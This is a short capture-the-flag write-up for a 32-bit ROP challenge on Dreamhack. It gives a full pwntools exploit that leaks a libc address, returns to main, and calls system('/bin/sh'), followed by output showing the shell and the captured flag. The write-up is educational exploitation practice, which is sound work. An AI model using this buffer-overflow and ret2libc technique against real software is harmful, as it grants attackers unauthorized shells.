### Overview
this challenge is the same as ``basic_rop_x64``, but this challenge is 32 bits, so it has something different to 64 bits

I do another way to solve it, this method called return2main 


### Exploitation
After leak libc base, we move to main again and call system(/bin/sh) function to get shell

```py
from pwn import *
# p = process('./basic_rop_x86')
p = remote('host8.dreamhack.games', 16441)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')


pop_esi_edi_ebp = 0x08048689
main = e.sym['main']
read_plt = e.plt['read']
write_plt = e.plt['write']
read_got = e.got['read']
sh = list(libc.search(b'/bin/sh'))[0]

buf = 0x40 * b'A'
payload = buf + b'A'*8 

# write(1, read_got, 4)
# in 32bits, we pass parameters through stack (push in reverse order)
payload+=p32(write_plt)
payload+=p32(pop_esi_edi_ebp)
payload+=p32(1)
payload+=p32(read_got)
payload+=p32(4)
payload+=p32(main) # after write out read address, move to main again


p.send(payload)
p.recvuntil(buf)
read_lib = u32(p.recv())
libc_base = read_lib - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + sh
print('read', hex(read_lib))
print('libc_base', hex(libc_base))
# return 2 main and call system(/bin/sh)
payload=b'A'*0x48
# you know, in 64 bits, to call system(/bin/sh) we need to set up sth like:
# rdi = /bin/sh
# ret
# call system
# but in 32 bits, it passes arguments through stack and in reverse order:
payload+=p32(system)
# because it passes argument through stack, so we dont need any registers to store "/bin/sh"
payload+=p32(0)+p32(binsh)
p.send(payload)
p.interactive()

```

### Result
```bash
$ python3 exploit.py
read 0xf7db34c0
libc_base 0xf7cab000
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
basic_rop_x86
flag
libc.so.6
$ cat flag
DH{511346c4606e748addd555cc9947aacf67990d504fac432f5dbb0f14eea8363b}
[*] Got EOF while reading in interactive
$ 
```